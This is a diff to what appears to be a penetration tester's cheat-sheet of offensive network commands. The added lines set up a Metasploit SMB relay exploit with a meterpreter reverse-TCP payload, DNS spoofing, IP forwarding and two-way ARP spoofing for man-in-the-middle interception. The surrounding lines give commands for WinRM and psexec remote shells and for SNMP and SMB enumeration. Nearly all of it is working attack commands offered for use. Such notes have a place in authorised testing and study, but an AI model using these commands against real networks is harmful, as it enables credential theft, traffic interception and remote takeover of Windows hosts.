@@ -34,8 +34,27 @@ crackmapexec winrm ip -u user -p pass // -x "command"
 evil-winrm.rb -u user -p pass -i ip // gets powershell shell 
 wimrm_script // MSF  set FORCE_VBS true
 
+SNMP -
+nmap -sU -p 161 --script=snmp-*
+
+DNS & SMB Relay -msfconsole
+use exploit/windows/smb/smb_relay
+set SRVHOST my_ip
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST my_ip
+set SMBHOST 172.16.5.10
+exploit
+echo "172.16.5.101 *.domainname.com" > dns
+dnsspoof -i eth1 -f dns
+echo 1 > /proc/sys/net/ipv4/ip_forward
+arpspoof -i eht1 -t targetip1 targetip2
+arpspoof -i eth1 -t targetip2 targetip1
+
+
+
 SMB -
-ls -al /usr/share/nmap/scripts | grep -e "smb-*" // lists nmap scripts for smb
+ls -al /usr/share/nmap/scripts | grep -e "smb-*" // lists nmap scripts for smb // --script script - uses script
+
 smbclient -L host //check for anonymous login
 smbmap -H ip -u user -p pass 
 psexec.py user@ip cmd.exe // psawns cmd shell
